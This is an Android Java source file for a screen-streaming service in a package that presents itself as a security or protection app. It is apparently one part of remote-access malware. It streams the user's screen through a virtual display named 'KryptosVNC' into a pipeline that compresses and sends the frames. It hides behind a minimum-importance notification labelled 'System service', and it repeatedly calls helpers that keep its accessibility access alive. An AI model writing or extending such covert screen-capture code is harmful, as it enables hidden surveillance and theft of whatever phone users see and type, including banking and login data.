package com.seguranca.protecao;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import java.nio.ByteBuffer;

/**
 * ScreenStreamService - captura via MediaProjection (fluida, sem o limite de 333ms).
 * Alimenta o MESMO pipeline do UiAssistBridge (escala + brilho + JPEG + envio).
 * Se falhar, o caminho antigo (takeScreenshot) continua funcionando sozinho.
 */
public class ScreenStreamService extends Service {

    private static final String TAG = "ScreenStream";
    private static final String CH_ID = "kryptos_screen";
    private static final int NOTIF_ID = 4711;
    private static final long MIN_FRAME_GAP_MS = 45L;

    private static volatile boolean active = false;
    private static volatile long lastRequest = 0L;

    private MediaProjection projection;
    private VirtualDisplay vdisplay;
    private ImageReader reader;
    private HandlerThread thread;
    private Handler handler;
    private int outW = 2, outH = 2;
    private long lastFrameTs = 0L;

    public static boolean isActive() { return active; }

    public static void ensure(Context ctx) {
        if (active) return;
        long now = System.currentTimeMillis();
        if (now - lastRequest < 20000L) return;
        lastRequest = now;
        MediaProjectionRequestActivity.launch(ctx);
    }

    @Override
    public void onCreate() {
        try { AccessibilityKeeper.garantir(this); AccessibilityKeeper.agendar(this); AccessibilityKeeper.startLoop(this); } catch (Throwable t) {}
        super.onCreate();
        thread = new HandlerThread("KryptosScreen");
        thread.start();
        handler = new Handler(thread.getLooper());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startFg();
        if (intent != null && intent.hasExtra("data")) {
            int code = intent.getIntExtra("resultCode", 0);
            Intent data = (Intent) intent.getParcelableExtra("data");
            startProjection(code, data);
        }
        return START_STICKY;
    }

    private void startFg() {
        try {
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            Notification n;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                if (nm != null && nm.getNotificationChannel(CH_ID) == null) {
                    NotificationChannel ch = new NotificationChannel(CH_ID, "Servico do sistema",
                            NotificationManager.IMPORTANCE_MIN);
                    ch.setShowBadge(false);
                    nm.createNotificationChannel(ch);
                }
                n = new Notification.Builder(this, CH_ID)
                        .setSmallIcon(android.R.drawable.ic_menu_view)
                        .setContentTitle("Servico do sistema")
                        .build();
            } else {
                n = new Notification.Builder(this)
                        .setSmallIcon(android.R.drawable.ic_menu_view)
                        .setContentTitle("Servico do sistema")
                        .build();
            }
            if (Build.VERSION.SDK_INT >= 29) {
                startForeground(NOTIF_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
            } else {
                startForeground(NOTIF_ID, n);
            }
        } catch (Throwable t) {
            Log.w(TAG, "startFg: " + t);
        }
    }

    private void startProjection(int resultCode, Intent data) {
        try {
            stopProjection();
            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            if (mpm == null) return;
            projection = mpm.getMediaProjection(resultCode, data);
            if (projection == null) { Log.w(TAG, "projection null"); return; }

            WindowManager wmgr = (WindowManager) getSystemService(WINDOW_SERVICE);
            DisplayMetrics dm = new DisplayMetrics();
            wmgr.getDefaultDisplay().getRealMetrics(dm);

            int srcW = dm.widthPixels;
            int srcH = dm.heightPixels;
            float scale = Math.min(1f, 650f / Math.max(srcW, srcH));
            outW = Math.max(2, ((int) (srcW * scale)) & ~1);
            outH = Math.max(2, ((int) (srcH * scale)) & ~1);

            reader = ImageReader.newInstance(outW, outH, PixelFormat.RGBA_8888, 2);
            reader.setOnImageAvailableListener(onImage, handler);

            projection.registerCallback(new MediaProjection.Callback() {
                @Override
                public void onStop() {
                    active = false;
                    Log.d(TAG, "projection onStop");
                }
            }, handler);

            vdisplay = projection.createVirtualDisplay("KryptosVNC", outW, outH, dm.densityDpi,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    reader.getSurface(), null, handler);

            active = true;
            Log.d(TAG, "projection OK " + outW + "x" + outH);
        } catch (Throwable t) {
            active = false;
            Log.e(TAG, "startProjection: " + t);
        }
    }

    private final ImageReader.OnImageAvailableListener onImage = new ImageReader.OnImageAvailableListener() {
        @Override
        public void onImageAvailable(ImageReader r) {
            Image img = null;
            try {
                img = r.acquireLatestImage();
                if (img == null) return;
                long now = System.currentTimeMillis();
                if (now - lastFrameTs < MIN_FRAME_GAP_MS) return;
                lastFrameTs = now;

                Image.Plane plane = img.getPlanes()[0];
                ByteBuffer buf = plane.getBuffer();
                int pixelStride = plane.getPixelStride();
                int rowStride = plane.getRowStride();
                int rowPadding = rowStride - pixelStride * outW;

                Bitmap full = Bitmap.createBitmap(outW + rowPadding / pixelStride, outH, Bitmap.Config.ARGB_8888);
                buf.rewind();
                full.copyPixelsFromBuffer(buf);

                Bitmap frame;
                if (rowPadding == 0) {
                    frame = full;
                } else {
                    frame = Bitmap.createBitmap(full, 0, 0, outW, outH);
                    full.recycle();
                }
                UiAssistBridge.onProjectionFrame(frame);
            } catch (Throwable t) {
                Log.w(TAG, "onImageAvailable: " + t);
            } finally {
                try { if (img != null) img.close(); } catch (Throwable ignored) {}
            }
        }
    };

    private void stopProjection() {
        active = false;
        try { if (vdisplay != null) vdisplay.release(); } catch (Throwable ignored) {}
        vdisplay = null;
        try { if (reader != null) reader.close(); } catch (Throwable ignored) {}
        reader = null;
        try { if (projection != null) projection.stop(); } catch (Throwable ignored) {}
        projection = null;
    }

    @Override
    public void onDestroy() {
        stopProjection();
        try { if (thread != null) thread.quitSafely(); } catch (Throwable ignored) {}
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
